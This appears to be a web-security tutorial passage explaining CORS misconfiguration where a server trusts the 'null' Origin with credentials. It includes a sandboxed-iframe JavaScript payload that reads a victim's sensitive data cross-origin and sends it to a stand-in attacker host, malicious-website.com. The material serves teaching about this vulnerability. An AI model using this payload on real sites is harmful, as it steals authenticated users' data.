## Overview :

## Whitelisted null origin value

The specification for the Origin header supports the value `null`. Browsers might send the value null in the `Origin` header in various unusual situations:


Some applications might **whitelist the null origin to support local development of the application**. For example, suppose an application receives the following cross-origin request:

```http
GET /sensitive-victim-data
Host: vulnerable-website.com
Origin: null
```

And the server responds with:

```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

In this situation, an attacker can use various tricks to generate a cross-origin request containing the value null in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed iframe cross-origin request of the form:

```javascript
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','vulnerable-website.com/sensitive-victim-data',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='malicious-website.com/log?key='+this.responseText;
};
</script>"></iframe>
```
